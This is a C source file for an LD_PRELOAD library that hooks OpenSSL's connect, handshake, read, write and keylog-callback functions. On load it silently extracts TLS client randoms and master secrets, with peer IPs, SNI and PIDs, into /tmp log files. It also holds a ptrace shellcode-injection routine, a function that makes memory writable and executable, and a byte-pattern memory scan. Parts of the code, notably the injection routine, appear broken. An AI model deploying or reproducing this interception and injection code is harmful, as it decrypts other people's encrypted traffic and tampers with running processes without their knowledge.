#define _GNU_SOURCE
#define OPENSSL_API_COMPAT 0x30000000L
#include <dlfcn.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/inotify.h>

#include <sys/mman.h>
#include <elf.h>
#include <link.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>

#define MAX_SSL_CONNECTIONS 100
#define EVENT_SIZE (sizeof(struct inotify_event))
#define EVENT_BUF_LEN (1024 * (EVENT_SIZE + 16))

typedef struct {
    SSL *ssl_ptr;
    unsigned char client_random[32];
    unsigned char master_secret[512];
    char sni[256];
    pid_t pid;
    pid_t tid;
    int socket_fd;
    char remote_ip[INET6_ADDRSTRLEN];
    int remote_port;
    time_t timestamp;
} SSLConnectionInfo;

typedef struct {
    void* base_addr;
    size_t size;
    char* pattern;
    size_t pattern_len;
} PatternSearchContext;

static FILE *keylog_file = NULL;
static FILE *debug_log = NULL;
static FILE *external_keylog_file = NULL;
static pthread_mutex_t log_mutex = PTHREAD_MUTEX_INITIALIZER;
static pthread_t monitor_thread;
static int inotify_fd = -1;
static int watch_fd = -1;
static char *sslkeylog_path = NULL;

static SSLConnectionInfo ssl_connections[MAX_SSL_CONNECTIONS];
static int connection_count = 0;

void bin2hex(const unsigned char *bin, size_t bin_len, char *hex) {
    for (size_t i = 0; i < bin_len; i++) {
        sprintf(hex + (i * 2), "%02x", bin[i]);
    }
    hex[bin_len * 2] = '\0';
}

void log_openssl_errors() {
    if (!debug_log) return;

    unsigned long err;
    char errbuf[256];

    while ((err = ERR_get_error()) != 0) {
        ERR_error_string_n(err, errbuf, sizeof(errbuf));
        fprintf(debug_log, "OpenSSL Error: %s\n", errbuf);
    }
    fflush(debug_log);
}

void extract_network_details(SSL *ssl, SSLConnectionInfo *conn_info) {
    int socket_fd = SSL_get_fd(ssl);
    conn_info->socket_fd = socket_fd;

    struct sockaddr_storage addr;
    socklen_t addr_len = sizeof(addr);

    if (getpeername(socket_fd, (struct sockaddr *)&addr, &addr_len) == 0) {
        if (addr.ss_family == AF_INET) {
            struct sockaddr_in *ipv4 = (struct sockaddr_in *)&addr;
            inet_ntop(AF_INET, &(ipv4->sin_addr), conn_info->remote_ip, INET6_ADDRSTRLEN);
            conn_info->remote_port = ntohs(ipv4->sin_port);
        } else if (addr.ss_family == AF_INET6) {
            struct sockaddr_in6 *ipv6 = (struct sockaddr_in6 *)&addr;
            inet_ntop(AF_INET6, &(ipv6->sin6_addr), conn_info->remote_ip, INET6_ADDRSTRLEN);
            conn_info->remote_port = ntohs(ipv6->sin6_port);
        }
    }
}

void log_tls_secrets(SSL *ssl) {
    if (!keylog_file || !ssl) return;

    pthread_mutex_lock(&log_mutex);

    if (connection_count >= MAX_SSL_CONNECTIONS) {
        connection_count = 0;
    }

    SSLConnectionInfo *conn_info = &ssl_connections[connection_count++];
    memset(conn_info, 0, sizeof(SSLConnectionInfo));
    conn_info->ssl_ptr = ssl;
    conn_info->pid = getpid();
    conn_info->tid = syscall(SYS_gettid);
    conn_info->timestamp = time(NULL);

    size_t random_len = SSL_get_client_random(ssl, conn_info->client_random, sizeof(conn_info->client_random));
    
    if (random_len == 0) {
        log_openssl_errors();
        pthread_mutex_unlock(&log_mutex);
        return;
    }

    SSL_SESSION *session = SSL_get_session(ssl);
    if (!session) {
        log_openssl_errors();
        pthread_mutex_unlock(&log_mutex);
        return;
    }

    size_t master_len = SSL_SESSION_get_master_key(session, conn_info->master_secret, sizeof(conn_info->master_secret));
    
    if (master_len > 0) {
        char random_hex[65];
        char master_hex[1025];
        
        bin2hex(conn_info->client_random, random_len, random_hex);
        bin2hex(conn_info->master_secret, master_len, master_hex);

        const char *sni = SSL_get_servername(ssl, TLSEXT_NAMETYPE_host_name);
        if (sni) {
            strncpy(conn_info->sni, sni, sizeof(conn_info->sni) - 1);
        }

        extract_network_details(ssl, conn_info);

        fprintf(keylog_file, "CLIENT_RANDOM %s %s\n", random_hex, master_hex);
        fprintf(keylog_file, "# PID: %d\n", conn_info->pid);
        fprintf(keylog_file, "# Thread: %d\n", conn_info->tid);
        
        if (conn_info->sni[0] != '\0') {
            fprintf(keylog_file, "# SNI: %s\n", conn_info->sni);
        }

        fprintf(keylog_file, "# Remote IP: %s\n", conn_info->remote_ip);
        fprintf(keylog_file, "# Remote Port: %d\n", conn_info->remote_port);
        
        const SSL_CIPHER *cipher = SSL_get_current_cipher(ssl);
        if (cipher) {
            fprintf(keylog_file, "# Cipher: %s\n", SSL_CIPHER_get_name(cipher));
        }

        if (debug_log) {
            fprintf(debug_log, "SSL Secret Extracted:\n");
            fprintf(debug_log, "  SSL Pointer: %p\n", (void*)ssl);
            fprintf(debug_log, "  Socket FD: %d\n", conn_info->socket_fd);
            fprintf(debug_log, "  Random Length: %zu\n", random_len);
            fprintf(debug_log, "  Master Key Length: %zu\n", master_len);
        }
        
        if (external_keylog_file) {
            fprintf(external_keylog_file, "CLIENT_RANDOM %s %s\n", random_hex, master_hex);
            fflush(external_keylog_file);
        }
        
        fflush(keylog_file);
        if (debug_log) fflush(debug_log);
    }

    pthread_mutex_unlock(&log_mutex);
}

void copy_keylog_entries() {
    if (!sslkeylog_path || !keylog_file) return;

    FILE *external_file = fopen(sslkeylog_path, "r");
    if (!external_file) return;

    char line[1024];
    while (fgets(line, sizeof(line), external_file) != NULL) {
        if (strncmp(line, "CLIENT_RANDOM", 12) == 0) {
            fprintf(keylog_file, "%s", line);
        }
    }

    fclose(external_file);
    fflush(keylog_file);
}

void *monitor_keylog_file(void *arg) {
    char buffer[EVENT_BUF_LEN];

    while (1) {
        int length = read(inotify_fd, buffer, EVENT_BUF_LEN);
        if (length < 0) {
            break;
        }

        for (int i = 0; i < length;) {
            struct inotify_event *event = (struct inotify_event *)&buffer[i];
            
            if (event->mask & IN_MODIFY) {
                copy_keylog_entries();
            }

            i += EVENT_SIZE + event->len;
        }
    }

    return NULL;
}

void* memory_pattern_search(void* start, size_t length, 
                            const char* pattern, size_t pattern_len) {
    for (size_t i = 0; i < length - pattern_len; i++) {
        if (memcmp(start + i, pattern, pattern_len) == 0) {
            return start + i;
        }
    }
    return NULL;
}

void enumerate_loaded_libraries() {
    FILE* maps = fopen("/proc/self/maps", "r");
    char line[256];
    
    if (debug_log) {
        fprintf(debug_log, "Loaded Libraries:\n");
    }
    
    while (fgets(line, sizeof(line), maps)) {
        char path[256] = {0};
        void* start, *end;
        
        if (sscanf(line, "%p-%p %*s %*s %*s %*s %s", 
                   &start, &end, path) == 3) {
            if (strstr(path, ".so")) {
                if (debug_log) {
                    fprintf(debug_log, "Library: %s, Address: %p\n", path, start);
                }
            }
        }
    }
    
    fclose(maps);
    
    if (debug_log) fflush(debug_log);
}

int inject_shellcode(pid_t target_pid, const unsigned char* shellcode, size_t shellcode_len) {
    struct user_regs_struct regs, original_regs;
    void* remote_addr = NULL;
    
    ptrace(PTRACE_ATTACH, target_pid, NULL, NULL);
    waitpid(target_pid, NULL, 0);
    
    ptrace(PTRACE_GETREGS, target_pid, NULL, &original_regs);
    
    remote_addr = (void*)(uintptr_t)ptrace(PTRACE_PEEKTEXT, target_pid, NULL, NULL);
    if (remote_addr == NULL) {
        perror("Failed to get remote address");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return -1;
    }
    
    for (size_t i = 0; i < shellcode_len; i += sizeof(long)) {
        long word;
        memcpy(&word, shellcode + i, sizeof(long));
        
        if (ptrace(PTRACE_POKETEXT, target_pid, remote_addr + i, word) == -1) {
            perror("Failed to write shellcode");
            ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
            return -1;
        }
    }
    
    ptrace(PTRACE_SETREGS, target_pid, NULL, &original_regs);
    ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
    
    return 0;
}

void* advanced_memory_search(PatternSearchContext* context) {
    FILE* maps = fopen("/proc/self/maps", "r");
    char line[256];
    void* result = NULL;
    
    while (fgets(line, sizeof(line), maps)) {
        void* start, *end;
        char perms[5];
        
        if (sscanf(line, "%p-%p %4s", &start, &end, perms) == 3) {
            if (strchr(perms, 'r')) {
                result = memory_pattern_search(start, (char*)end - (char*)start, 
                                               context->pattern, context->pattern_len);
                if (result) break;
            }
        }
    }
    
    fclose(maps);
    return result;
}

int modify_memory(void* addr, const unsigned char* data, size_t length) {
    mprotect(addr, length, PROT_READ | PROT_WRITE | PROT_EXEC);
    memcpy(addr, data, length);
    return 0;
}

void advanced_ssl_discovery() {
    enumerate_loaded_libraries();
    
    const char* ssl_patterns[] = {
        "\x48\x89\x5C\x24\x08",
        "\x55\x8B\xEC",
        "\xE8\x00\x00\x00\x00\x48\x89\xC7"
    };
    
    for (int i = 0; i < sizeof(ssl_patterns)/sizeof(ssl_patterns[0]); i++) {
        PatternSearchContext ctx = {
            .pattern = (char*)ssl_patterns[i],
            .pattern_len = strlen(ssl_patterns[i])
        };
        
        void* potential_ssl_func = advanced_memory_search(&ctx);
        if (potential_ssl_func) {
            if (debug_log) {
                fprintf(debug_log, "Найдена потенциальная SSL функция: %p\n", potential_ssl_func);
            }
        }
    }
}

#define SSL_INTERCEPT(func_name) \
int func_name(SSL *ssl) { \
    static int (*real_##func_name)(SSL*) = NULL; \
    \
    if (!real_##func_name) { \
        real_##func_name = dlsym(RTLD_NEXT, #func_name); \
    } \
\
    FILE* force_log = fopen("/tmp/hardcore_ssl.log", "a+"); \
    if (force_log) { \
        fprintf(force_log, "[HARD INTERCEPT] %s\n", #func_name); \
        \
        int fd = SSL_get_fd(ssl); \
        struct sockaddr_storage addr; \
        socklen_t addr_len = sizeof(addr); \
        char ip[INET6_ADDRSTRLEN] = {0}; \
        int port = 0; \
        \
        if (getpeername(fd, (struct sockaddr *)&addr, &addr_len) == 0) { \
            if (addr.ss_family == AF_INET) { \
                struct sockaddr_in *ipv4 = (struct sockaddr_in *)&addr; \
                inet_ntop(AF_INET, &(ipv4->sin_addr), ip, sizeof(ip)); \
                port = ntohs(ipv4->sin_port); \
            } \
        } \
        \
        fprintf(force_log, "TUNNEL IP: %s:%d\n", ip, port); \
        fprintf(force_log, "SSL FD: %d\n", fd); \
        fflush(force_log); \
        fclose(force_log); \
    } \
\
    int result = real_##func_name(ssl); \
    log_tls_secrets(ssl); \
\
    return result; \
}

SSL_INTERCEPT(SSL_do_handshake)
SSL_INTERCEPT(SSL_connect)

int SSL_write(SSL *ssl, const void *buf, int num) {
    static int (*real_SSL_write)(SSL*, const void*, int) = NULL;
    
    if (!real_SSL_write) {
        real_SSL_write = dlsym(RTLD_NEXT, "SSL_write");
    }

    log_tls_secrets(ssl);

    return real_SSL_write(ssl, buf, num);
}

int SSL_read(SSL *ssl, void *buf, int num) {
    static int (*real_SSL_read)(SSL*, void*, int) = NULL;
    
    if (!real_SSL_read) {
        real_SSL_read = dlsym(RTLD_NEXT, "SSL_read");
    }

    log_tls_secrets(ssl);

    return real_SSL_read(ssl, buf, num);
}

void SSL_CTX_set_keylog_callback(SSL_CTX *ctx, void (*cb)(const SSL *ssl, const char *line)) {
    static void (*real_SSL_CTX_set_keylog_callback)(SSL_CTX*, void (*)(const SSL*, const char*)) = NULL;
    
    if (!real_SSL_CTX_set_keylog_callback) {
        real_SSL_CTX_set_keylog_callback = dlsym(RTLD_NEXT, "SSL_CTX_set_keylog_callback");
    }

    void custom_keylog_callback(const SSL *ssl, const char *line) {
        if (!keylog_file) {
            keylog_file = fopen("/tmp/ssl_keys.log", "a+");
        }

        if (keylog_file) {
            fprintf(keylog_file, "KEYLOG_CALLBACK: %s\n", line);
            fflush(keylog_file);
        }

        if (cb) {
            cb(ssl, line);
        }
    }

    real_SSL_CTX_set_keylog_callback(ctx, custom_keylog_callback);
}

__attribute__((constructor))
static void init(void) {
    keylog_file = fopen("/tmp/ssl_keys.log", "a+");
    debug_log = fopen("/tmp/ssl_debug.log", "a+");
    
    ERR_load_crypto_strings();
    OpenSSL_add_all_algorithms();
    
    sslkeylog_path = getenv("SSLKEYLOGFILE");
    
    if (sslkeylog_path) {
        external_keylog_file = fopen(sslkeylog_path, "a+");
        
        inotify_fd = inotify_init();
        if (inotify_fd > 0) {
            watch_fd = inotify_add_watch(inotify_fd, sslkeylog_path, IN_MODIFY);
            
            pthread_create(&monitor_thread, NULL, monitor_keylog_file, NULL);
        }
    }
    
    if (keylog_file) {
        fprintf(keylog_file, "\n# SSL Key Logging Started at %ld\n", time(NULL));
        fflush(keylog_file);
    }

    if (debug_log) {
        fprintf(debug_log, "\n# SSL Debug Logging Started at %ld\n", time(NULL));
        fflush(debug_log);
    }

    advanced_ssl_discovery();
}

__attribute__((destructor))
static void fini(void) {
    if (keylog_file) {
        fprintf(keylog_file, "# SSL Key Logging Stopped at %ld\n", time(NULL));
        fclose(keylog_file);
    }

    if (debug_log) {
        fprintf(debug_log, "# SSL Debug Logging Stopped at %ld\n", time(NULL));
        fclose(debug_log);
    }

    if (external_keylog_file) {
        fclose(external_keylog_file);
    }
    
    if (inotify_fd > 0) {
        inotify_rm_watch(inotify_fd, watch_fd);
        close(inotify_fd);
    }

    ERR_free_strings();
    EVP_cleanup();
}